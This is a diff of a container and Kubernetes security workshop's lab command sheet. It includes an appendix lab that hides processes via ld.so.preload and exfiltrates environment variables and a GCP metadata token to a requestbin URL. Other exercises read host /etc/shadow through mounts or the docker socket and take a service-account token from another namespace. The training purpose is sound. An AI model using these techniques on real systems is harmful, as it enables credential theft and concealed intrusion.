@@ -5,28 +5,17 @@
 
 ## Module 1 - Docker
 
-#### Slide 11 - Listing namespace you're in
-
-```
-ls -l /proc/self/ns/
-```
-
-#### Slide 12 - List cgroup for process 1
-
-```
-cat /proc/1/cgroup
-```
-
-#### Slide 16 - Docker client (exercise)
+#### Slide 17 - Exercise - is this thing on?
 
 ```
 docker --help
 ```
+
 ```
 docker run --help
 ```
 
-#### Slide 17 - Docker health check (troubleshoot)
+#### Slide 18 - Troubleshoot (Docker health check)
 
 Is Docker reporting down or VM was stopped after setting up, try running these commands:
 
@@ -47,12 +36,12 @@ Create this ACL so you can run docker command without typing sudo everytime.
 sudo setfacl -m user:$USER:rw /var/run/docker.sock
 ```
 
-#### Slide 18 - Babby's first image
+#### Slide 19 - Babby's first image
 ```
 docker run hello-world
 ```
 
-### Slide 19 - Single Command/Interactive Containers
+### Slide 20 - Single Command/Interactive Containers
 
 Running single command in a container
 ```
@@ -69,7 +58,7 @@ Type `exit` to exit the shell session in the container
 >  
 >  -t, --tty                            Allocate a pseudo-TTY
 
-### Slide 20 - Interactive Containers (cont)
+### Slide 21 - Interactive Containers (cont)
 
 List running containers?
 ```
@@ -98,7 +87,7 @@ Note: exit once done
 exit
 ```
 
-### Slide 21 - Background a container
+### Slide 22 - Background a container
 
 ```
 docker run -d nginx
@@ -120,13 +109,13 @@ docker run --name webserver -d nginx
 docker container ls
 ```
 
-### Slide 22 - Container Persistence
+### Slide 23 - Container Persistence
 
 ```
 docker ps -a
 ```
 
-### Slide 23 - Process Hierarchy
+### Slide 24 - Process Hierarchy
 
 ```
 docker run -d nginx
@@ -137,13 +126,13 @@ ps auxf
 
 ## Module 2 - Exploring Containers
 
-### Slide 26 - Where do images come from?
+### Slide 27 - Where do images come from?
 
 ```
 docker search nmap
 ```
 
-### Slide 28 - Exercise: Exploring Images and Container History
+### Slide 29 - Exercise: Exploring Images and Container History
 
 ```
 docker run --name hist -it alpine /bin/ash
@@ -166,13 +155,13 @@ docker container commit hist history_test
 docker image history history_test
 ```
 
-### Slide 29 - Exercise: Exploring Container Images and History from DockerHub
+### Slide 30 - Exercise: Exploring Container Images and History from DockerHub
 
 ```
 docker search dropboxservice
 ```
 
-### Slide 30 - Docker Image History
+### Slide 31 - Docker Image History
 
 ```
 docker pull mkefi/dropboxservice:latest
@@ -192,7 +181,7 @@ docker history --no-trunc --format "{{.CreatedAt}}: {{.CreatedBy}}" mkefi/dropbo
 
 > Use up and down arrow keys or `[SPACE]` to navigate, type `q` to quit
 
-### Slide 32 - Extract without running
+### Slide 33 - Extract without running
 
 ```
 docker create mkefi/dropboxservice
@@ -215,7 +204,7 @@ Now that we've extracted the jar, we can remove the container. Use same containe
 docker rm $container_id
 ```
 
-### Slide 33 - Optional, quick checks
+### Slide 34 - Optional, quick checks
 
 ```
 file /tmp/app.jar
@@ -234,7 +223,7 @@ Note the start class
 strings /tmp/app.jar |less 
 ```
 
-### Slide 34 - Going the distance - decompile (with docker!)
+### Slide 35 - Going the distance - decompile (with docker!)
 
 ```
 docker run -it --rm -v /tmp/:/mnt/ --user $(id -u):$(id -g) kwart/jd-cli /mnt/app.jar -od /mnt/app-decompiled
@@ -245,10 +234,10 @@ ls /tmp/app-decompiled/
 ```
 
 ```
-less /tmp/app-decompiled/BOOT-INF/classes/com/wellsfargo/uploadexcel/entity/StockDetailsEntity.java
+less /tmp/app-decompiled/BOOT-INF/classes/application.yml
 ```
 
-### Slide 35 - Manual Reversing (just another way of extracting files from an image)
+### Slide 36 - Manual Reversing (just another way of extracting files from an image)
 
 ```
 cd ~ && mkdir testimage && cd testimage
@@ -263,13 +252,13 @@ docker save -o nginx.tar nginx
 tar -xvf nginx.tar
 ```
 
-### Slide 36 - Manual Reversing cont.
+### Slide 37 - Manual Reversing cont.
 
 ```
 cat <hash>/json | jq
 ```
 
-### Slide 38 - Optional - Automated
+### Slide 39 - Optional - Automated
 
 ```
 sudo docker run -t --rm -v /var/run/docker.sock:/var/run/docker.sock:ro pegleg/whaler -sV=1.36 nginx:latest
@@ -278,7 +267,13 @@ sudo docker run -t --rm -v /var/run/docker.sock:/var/run/docker.sock:ro pegleg/w
 sudo docker run -t --rm -v /var/run/docker.sock:/var/run/docker.sock:ro pegleg/whaler -sV=1.36 wellsfargo102/upload
 ```
 
-### Slide 42 - is nginx real?
+### Slide 42 - Watch out: Exposing Services
+
+```
+docker run -d -p 8080:80 nginx
+```
+
+### Slide 43 - is nginx real?
 
 ```
 docker image inspect nginx | jq
@@ -290,23 +285,27 @@ docker trust inspect nginx | jq
 
 ## Module 3: Offensive Docker Techniques
 
-### Slide 47 - Starting Tracee
+### Slide 48 - Starting Tracee
 
 Start a new terminal window
 ```
-docker run --name tracee --rm -it --pid=host --cgroupns=host --privileged -v /etc/os-release:/etc/os-release-host:ro \
+docker run --name tracee -d --rm --pid=host --cgroupns=host --privileged -v /etc/os-release:/etc/os-release-host:ro \
 -e LIBBPFGO_OSRELEASE_FILE=/etc/os-release-host aquasec/tracee:latest
 ```
 
->Ctrl-C will stop tracee if needed
+```
+docker logs tracee --follow 2>$1 |grep MatchedPolicies
+```
 
-### Slide 48 - Create a Dockerfile
+### Slide 49 - Create a Dockerfile
 
 ```
 cd ~ && mkdir imagetest && cd imagetest && vi Dockerfile
 ```
 
 Note: Go to requestbin.com and choose the public bin link below the large Create Request Bin button
+
+### Slide 50 - Create a Dockerfile
 
 Paste the below contents into the vi after hitting `i` for insert
 ```
@@ -329,11 +328,14 @@ ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
 > After pasting, hit `[ESC]`, then type `:wq`
 
 
-### Slide 49 - Create an entrypoint script
+### Slide 51 - Create an entrypoint script
 
 ```
 vi docker-entrypoint.sh
 ```
+
+### Slide 52 - Create an entrypoint script
+
 Paste the below script into the vi after hitting `i` for insert 
 ```
 #!/usr/bin/env bash
@@ -353,7 +355,7 @@ fi
 ```
 > After pasting, hit `ESC`, then type `:wq`
 
-### Slide 50 - Build and run your image
+### Slide 53 - Build and run your image
 
 ```
 docker build -t cmddemo .
@@ -363,7 +365,7 @@ docker build -t cmddemo .
 docker run cmddemo
 ```
 
-### Slide 51 - Build and run your image (cont.)
+### Slide 54 - Build and run your image (cont.)
 
 The trick to this one is pasting the contents of the cookie field in the request you recieved on requestbin, into the base64 command below. This will decode it and pipe through gunzip to decompress the contents.
 ```
@@ -372,7 +374,7 @@ base64 -d <<< [cookie field content] | gunzip
 
 >Take a look back at tracee terminal per slide 52
 
-### Slide 53 - Observing Docker
+### Slide 56 - Observing Docker
 
 ```
 docker ps
@@ -391,7 +393,7 @@ docker events
 >sudo ctr --address /var/run/containerd/containerd.sock events
 >```
 
-### Slide 55 - Working with external data / using Docker in your offensive toolkit
+### Slide 58 - Working with external data / using Docker in your offensive toolkit
 
 ```
 docker run --rm -it instrumentisto/nmap -A -T4 scanme.nmap.org
@@ -411,7 +413,7 @@ ls -l ~/vol_test
 cat test.nmap
 ```
 
-### Slide 57 - Docker with root or etc mounted as volume
+### Slide 60 - Docker with root or etc mounted as volume
 
 ```
 docker run -it -v /:/host alpine /bin/ash
@@ -423,7 +425,7 @@ cat /host/etc/shadow
 exit
 ```
 
-### Slide 58 - Docker running privileged containers
+### Slide 61 - Docker running privileged containers
 
 ```
 docker run -it --privileged ubuntu /bin/bash
@@ -444,7 +446,7 @@ capsh --decode=0000003fffffffff
 exit
 ```
 
-### Slide 59 - Exercise: Docker socket exposed in container
+### Slide 62 - Exercise: Exposed Docker socket hijinx
 
 ```
 docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/dash
@@ -470,7 +472,7 @@ Make note of the first 4-5 characters of the ID returned, you'll need it in the 
 curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<id 4-5 first chars>/start
 ```
 
-### Slide 60 - Exposed docker socket hijinx (cont.)
+### Slide 63 - Exposed docker socket hijinx (cont.)
 
 ```
 socat - UNIX-CONNECT:/var/run/docker.sock
@@ -492,199 +494,21 @@ ls
 cat /host_etc/shadow
 ```
 
-### Slide 61 - Docker persistence
+### Slide 64 - Docker persistence
 
 ```
 docker run -d --restart always nginx
 ```
 
 
-### Slide 63 - Exercise: Libprocess hider lab
-
-Let's go back to our cmddemo Dockerfile
-```
-cd ~/imagetest
-```
-```
-git clone https://github.com/gianlucaborello/libprocesshider
-```
-```
-cd libprocesshider && vi processhider.c
-```
-
-Change this:
-```
-/*
- * Every process with this name will be excluded
- */
-static const char* process_to_filter = "evil_script.py";
-```
-to this (use `i` to enter insert mode in vi):
-```
-static const char* process_to_filter = "sleep";
-```
-> After changing, hit `[ESC]`, then type `:wq`
-
-Compile:
-```
-make
-```
-
-### Slide 64 - Libprocess hider lab (cont.)
-
-```
-cd ..
-```
-We're going to update the Dockerfile from our cmddemo to do more things
-```
-vi Dockerfile
-```
-We're going to add 4 new lines
-
->Reminder about vi: `i` for insert mode to edit text, use arrow keys to navigate, `[ESC]` to exit insert mode, `:wq` to save(write to file) and quit
-
-Between these two lines
-```
-RUN apt update && apt upgrade -y && apt install -y curl tini
-COPY ./docker-entrypoint.sh /docker-entrypoint.sh
-```
-Add:
-```
-COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
-RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
-```
-This copies in the library we just compiled and adds an entry to the ld.so.preload file to load it during "preload"
-
-Between these two lines
-```
-ENV USER HANDLE
-ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
-```
-add and replace PASSWORD with one you made up:
-```
-# Replace password with a unique one of your own
-ENV PW PASSWORD
-```
-
-When is all done, your Dockerfile should look like this.
-
-```
-FROM ubuntu:20.04
-RUN groupadd -g 999 usertest && \
-useradd -r -u 999 -g usertest usertest
-RUN apt update && apt upgrade -y && apt install -y curl tini
-COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
-RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
-COPY ./docker-entrypoint.sh /docker-entrypoint.sh
-RUN chmod +x /docker-entrypoint.sh
-USER usertest
-# Go to requestbin.net and get a public url and replace below
-ENV URL REQUESTBIN_URL
-ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
-# Replace HANDLE with your l33t hacker name or some other identifying designation
-ENV USER HANDLE
-# Replace password with a unique one of your own
-ENV PW PASSWORD
-ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
-```
-> After pasting, hit `[ESC]`, then type `:wq`
-
-### Slide 65 - Libprocess hider lab (cont.)
-
->`[ESC]` then type `:wq` if you haven't already from last slide
-
-We're also going to edit the docker-entrypoint.sh file, it's easier to just replace the whole thing.
-```
-vi docker-entrypoint.sh
-```
-
->vi Tip: just hit `dd` repeatedly to delete whole lines, then go into insert mode and paste the contents below
-```
-#!/usr/bin/env bash
-
-if [ "shell" = "${1}" ]; then
-  /bin/bash
-else
- while true
- do
-    sleep 30
-    curl -s  -X POST -A "${UA}" -H "X-User: ${HANDLE}" -H "Cookie: `uname -a | gzip | base64 -w0`" -d \
-`{ env && curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token; } | gzip | openssl enc -e -aes-256-cbc -md sha512 -pbkdf2 -salt -a -pass "pass:${PW}" | base64 -w0` \
-$URL
-    echo
- done
-fi
-```
-
-This adds a little more data to our exfil, we'll go over this.
-
-> After pasting, hit `[ESC]`, then type `:wq`
-
-### Slide 66 - Libprocess hider lab (cont.)
-
->`[ESC]` then type `:wq` if you haven't already from last slide
-
-Rebuild the container
-```
-docker build -t cmddemo .
-```
-
-Run the container in the background(detached) and just give us the container id (`-d` aka `--detach`)
-```
-docker run -d cmddemo
-```
-
-After 30 seconds, you should see a new request on your requestbin tab (that hopefully you kept open). If not create a new public requestbin, re-edit your Dockerfile, replace the environment variable value with the new one, rebuild, and re-run the container.
-
-### Slide 67 - Libprocess hider lab (cont.)
-
-Decrypt and decode the new data in the raw output of the requestbin request that came in. Replace `[DATA]` with the base64 string from it in the command below. Don't forget to replace `[strong password]` in the command below with the one you set in the Dockerfile.
-
-Enter these commands below as three separate lines, do not hit `[ENTER]` until you've replaced the `[DATA]` and the password.
-** use the clipboard function for these comands with newline `\` otherwise it'll hit return before you're ready. **
-
-```
-base64 -d <<< [DATA] \
-```
-```
-| openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -a -salt -pass "pass:[strong password]" \
-```
-```
-| gunzip
-```
-
-What do you see? Why would this information be useful to an attacker?
-
-Let's test out the libprocesshider
-
-```
-docker ps
-```
-Use id/name in to replace `[container name/id]` in command below
-```
-docker exec [container name/id] ps auxf
-```
-Where's the sleep process?
-
-Run the process list outside the container/namespace.
-```
-ps auxf |grep systemd
-```
-There it is, why isn't it hiding the process outside the namespace?
-
-Stop the container (running in background) now that we're done with it. 
-```
-docker stop [container name/id]
-```
-
 ## Module 4 - Container IR - GL,HF.
 
-### Slide 69 - Image CTF
+### Slide 68 - Image CTF
 ```
 docker image pull digitalshokunin/webserver
 ```
 
-### Slide 76 - Clean ups
+### Slide 75 - Clean ups
 
 ```
 docker system df
@@ -704,23 +528,35 @@ docker container prune
 
 ## Module 6 - The Basics of using K8S
 
-### Slide 100 - Creating a namespace
+### Slide 96 - Try out kubectl
+
+```
+kubectl get nodes
+```
+
+### Slide 97 - Namespaces
+
+```
+kubectl get namespaces
+```
+
+### Slide 98 - Creating a namespace
 
 ```
 kubectl create namespace lab-namespace
 ```
 
 ```
-kubectl get namespace
+kubectl get namespaces
 ```
 
-### Slide 103 - Accessing a cluster
+### Slide 101 - Accessing a cluster
 
 ```
 kubectl cluster-info
 ```
 
-### Slide 105 - Display pods
+### Slide 103 - Display pods
 
 ```
 kubectl get pods
@@ -741,7 +577,7 @@ Describe (get more details) on a pod
 kubectl -n kube-system describe pod <name>
 ```
 
-### Slide 107 - Run first pod
+### Slide 105 - Babby's first pod
 
 ```
 wget https://k8s.io/examples/pods/simple-pod.yaml
@@ -773,61 +609,114 @@ kubectl get pod nginx -o wide --namespace lab-namespace
 
 ## Module 7 - Kubernetes Security
 
-### Slide XXX - Setup Kubernetes labs
+### Slide 120 - Lab Setup
 
 ```
 ansible k8s-ansible-setup.yml
 ```
 
+
+### Slide 123 - Lab Scenario
+
+By now your Ansible playbook should have finished with no errors, if so great, if not, get our TA's attention.
+
+We need the to pretend we've compromised dev creds to Kubernetes, we'll do this by switching kubectl's context (contexts are often used when kubectl users have multiple clusters or accounts)
 ```
-kubectl get namespace
+kubectl config use-context developer@kind-lab
 ```
 
+### Slide 124 - Priv esc - to golden tickets (lab)
 
-### Slide 126 - Priv esc - to golden tickets (lab)
-
-We need the IP for the cluster, going to get it from Docker container for the control plane and assign it to a shell env variable
+What can it do?
 ```
-export CLUSTERIP1=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' etcdnoauth-control-plane)
-```
-This is needed for etcdctl to work
-```
-export ETCDCTL_API=3
+kubectl auth can-i --list
 ```
 
+Permissions on dev account seem to be very limited
 ```
-etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 get / --prefix --keys-only
+kubectl get pods
+```
+There's one pod we seem to have access to...
+
+Let's exec into it. Change the `[rand]` below to match the random string in the pod name from the last command
+```
+kubectl exec -it myapp-[rand] -- /bin/bash
 ```
 
-Let's go after the admin token
-```
-etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 \
-get / --prefix --keys-only |grep admins-account-token
-```
-Make note of the random string at the end of the token name, you'll need it later
+### Slide 125 - Priv esc - to golden tickets (lab cont.)
 
-### Slide 124 - Priv esc - to golden tickets (lab continued)
+Install some tools we'll need
 
-Install some utilities
+**Note:** we can do this because we're running in the container as root, otherwise we'd just pull in these tools some other way
+
 ```
 apt update && apt install -y curl
 ```
-Download and install kubectl into the container
+
 ```
 curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
 ```
 
+chmod `kubectl`  and move it to /usr/local/bin 
+
 ```
-chmod +x kubectl && mv /usr/local/bin/
+chmod +x kubectl && mv kubectl /usr/local/bin
+```
+
+Use kubectl to see what we can do from this pod?
+
+```
+kubectl auth can-i --list
+```
+### Slide 126 - Priv esc - Why does this work?
+
+Look at the pod's service account K8S mounts inside the container
+
+```
+ls -l /var/run/secrets/kubernetes.io/serviceaccount/
+```
+
+### Slide 127 - Priv esc - to golden tickets (lab cont.)
+
+Get secrets
+
+```
+kubectl get secrets
+```
+
+Not much there, lets see if we can see secrets outside our namespace?
+
+```
+kubectl get secrets --all-namespaces
+```
+
+One of these looks interesting...
+
+```
+kubectl get secrets -n tracee-system | grep security
+```
+
+Let's try and get the service account token stored in this secret
+```
+kubectl -n tracee-system get secret security-svc-token -o json
+```
+
+For this command we used `-o json`, hence the output details in json, some cases makes it easier to parse
+
+### Slide 129 - Priv esc - to golden tickets (lab cont.)
+
+we need to get the token in a form we can use
+
+```
+export TOKEN=$(kubectl -n tracee-system get secret security-svc-token -o=jsonpath="{.data.token}" | base64 -d)
+```
+
+```
+kubectl auth can-i --list
 ```
 
 
 
-```
-vim token.txt
-```
-
-Paste the contents of the token you copied above by hitting `i`, then pasting.
 
 When done, `[ESC]` to exit insert mode, then type `:` to bring up vim prompt, and type `wq` and press `[ENTER]` to issue the write to file and quit commands to vi
 
@@ -1185,6 +1074,188 @@ Paste the json in the text box labeled 'Import via panel json'
 Click the `[Load]` button
 
 ## Appendix
+
+
+### Slide 161 - Exercise: Libprocess hider lab
+
+#### This lab was part of our original workshop, but eBPF and other changes like observability sitting outside namespace have made it irrelevant. That said, it's still a fun exercise and shows off some cool LoL techniques for data exfil.
+
+Let's go back to our cmddemo Dockerfile
+```
+cd ~/imagetest
+```
+```
+git clone https://github.com/gianlucaborello/libprocesshider
+```
+```
+cd libprocesshider && vi processhider.c
+```
+
+Change this:
+```
+/*
+ * Every process with this name will be excluded
+ */
+static const char* process_to_filter = "evil_script.py";
+```
+to this (use `i` to enter insert mode in vi):
+```
+static const char* process_to_filter = "sleep";
+```
+> After changing, hit `[ESC]`, then type `:wq`
+
+Compile:
+```
+make
+```
+
+### Slide 162 - Libprocess hider lab (cont.)
+
+```
+cd ..
+```
+We're going to update the Dockerfile from our cmddemo to do more things
+```
+vi Dockerfile
+```
+We're going to add 4 new lines
+
+>Reminder about vi: `i` for insert mode to edit text, use arrow keys to navigate, `[ESC]` to exit insert mode, `:wq` to save(write to file) and quit
+
+Between these two lines
+```
+RUN apt update && apt upgrade -y && apt install -y curl tini
+COPY ./docker-entrypoint.sh /docker-entrypoint.sh
+```
+Add:
+```
+COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
+RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
+```
+This copies in the library we just compiled and adds an entry to the ld.so.preload file to load it during "preload"
+
+Between these two lines
+```
+ENV USER HANDLE
+ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
+```
+add and replace PASSWORD with one you made up:
+```
+# Replace password with a unique one of your own
+ENV PW PASSWORD
+```
+
+When is all done, your Dockerfile should look like this.
+
+```
+FROM ubuntu:20.04
+RUN groupadd -g 999 usertest && \
+useradd -r -u 999 -g usertest usertest
+RUN apt update && apt upgrade -y && apt install -y curl tini
+COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
+RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
+COPY ./docker-entrypoint.sh /docker-entrypoint.sh
+RUN chmod +x /docker-entrypoint.sh
+USER usertest
+# Go to requestbin.net and get a public url and replace below
+ENV URL REQUESTBIN_URL
+ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
+# Replace HANDLE with your l33t hacker name or some other identifying designation
+ENV USER HANDLE
+# Replace password with a unique one of your own
+ENV PW PASSWORD
+ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
+```
+> After pasting, hit `[ESC]`, then type `:wq`
+
+### Slide 163 - Libprocess hider lab (cont.)
+
+>`[ESC]` then type `:wq` if you haven't already from last slide
+
+We're also going to edit the docker-entrypoint.sh file, it's easier to just replace the whole thing.
+```
+vi docker-entrypoint.sh
+```
+
+>vi Tip: just hit `dd` repeatedly to delete whole lines, then go into insert mode and paste the contents below
+```
+#!/usr/bin/env bash
+
+if [ "shell" = "${1}" ]; then
+  /bin/bash
+else
+ while true
+ do
+    sleep 30
+    curl -s  -X POST -A "${UA}" -H "X-User: ${HANDLE}" -H "Cookie: `uname -a | gzip | base64 -w0`" -d \
+`{ env && curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token; } | gzip | openssl enc -e -aes-256-cbc -md sha512 -pbkdf2 -salt -a -pass "pass:${PW}" | base64 -w0` \
+$URL
+    echo
+ done
+fi
+```
+
+This adds a little more data to our exfil, we'll go over this.
+
+> After pasting, hit `[ESC]`, then type `:wq`
+
+### Slide 164 - Libprocess hider lab (cont.)
+
+>`[ESC]` then type `:wq` if you haven't already from last slide
+
+Rebuild the container
+```
+docker build -t cmddemo .
+```
+
+Run the container in the background(detached) and just give us the container id (`-d` aka `--detach`)
+```
+docker run -d cmddemo
+```
+
+After 30 seconds, you should see a new request on your requestbin tab (that hopefully you kept open). If not create a new public requestbin, re-edit your Dockerfile, replace the environment variable value with the new one, rebuild, and re-run the container.
+
+### Slide 165 - Libprocess hider lab (cont.)
+
+Decrypt and decode the new data in the raw output of the requestbin request that came in. Replace `[DATA]` with the base64 string from it in the command below. Don't forget to replace `[strong password]` in the command below with the one you set in the Dockerfile.
+
+Enter these commands below as three separate lines, do not hit `[ENTER]` until you've replaced the `[DATA]` and the password.
+** use the clipboard function for these comands with newline `\` otherwise it'll hit return before you're ready. **
+
+```
+base64 -d <<< [DATA] \
+```
+```
+| openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -a -salt -pass "pass:[strong password]" \
+```
+```
+| gunzip
+```
+
+What do you see? Why would this information be useful to an attacker?
+
+Let's test out the libprocesshider
+
+```
+docker ps
+```
+Use id/name in to replace `[container name/id]` in command below
+```
+docker exec [container name/id] ps auxf
+```
+Where's the sleep process?
+
+Run the process list outside the container/namespace.
+```
+ps auxf |grep systemd
+```
+There it is, why isn't it hiding the process outside the namespace?
+
+Stop the container (running in background) now that we're done with it. 
+```
+docker stop [container name/id]
+```
+
 
 ### Slide 178 - Complex Microservices app demo
 
